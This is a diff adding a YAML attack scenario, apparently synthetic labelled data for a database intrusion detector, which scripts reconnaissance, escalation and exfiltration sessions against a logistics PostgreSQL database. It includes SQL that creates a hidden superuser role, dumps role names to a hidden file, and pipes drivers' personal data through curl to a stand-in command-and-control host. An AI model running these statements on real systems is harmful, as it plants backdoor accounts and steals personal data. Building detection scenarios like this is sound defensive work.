@@ -1,0 +1,49 @@
+scenario_id: logistics_multi_apt_0009
+family_id: logistics_multi_apt_0009
+domain: logistics
+time_of_day: 03:00
+default_class: malicious
+rule_engine_relationship: agrees
+sessions:
+- session_label: recon
+  role: dispatcher
+  class: malicious
+  anchor: db
+  timing:
+    tempo: steady
+    step_gaps_seconds:
+    - 2.9695038534257963
+  events:
+  - sql: SELECT table_name FROM information_schema.tables WHERE table_schema = 'public'
+  - sql: SELECT column_name FROM information_schema.columns WHERE table_name = 'drivers'
+  - step_id: recon_probe
+    sql: COPY (SELECT 'probe') TO PROGRAM 'cat > /dev/null'
+- session_label: escalate
+  role: dispatcher
+  class: malicious
+  anchor: db
+  delay_after_previous_seconds: 6.971267040800645
+  timing:
+    tempo: bursty
+    step_gaps_seconds:
+    - 0.4393828686865605
+  events:
+  - step_id: create_shadow
+    sql: CREATE ROLE apt_shadow SUPERUSER LOGIN PASSWORD '1EKKhNyhFg'
+  - step_id: dump_creds
+    sql: COPY (SELECT rolname FROM pg_authid) TO PROGRAM 'cat >> /tmp/.cache/roles.txt'
+- session_label: exfil
+  role: partner_etl_service
+  class: malicious
+  anchor: db
+  delay_after_previous_seconds: 53.747126806182564
+  timing:
+    tempo: steady
+    step_gaps_seconds:
+    - 2.150084525368559
+  events:
+  - step_id: exfil
+    sql: COPY (SELECT d.license_number, d.home_address, d.phone, s.dest_address FROM drivers d JOIN shipments s ON s.driver_id = d.driver_id) TO PROGRAM 'curl -sX POST https://c2.example.net/data -d @-'
+    connects_to:
+      ip: 185.100.87.41
+      port: 9443
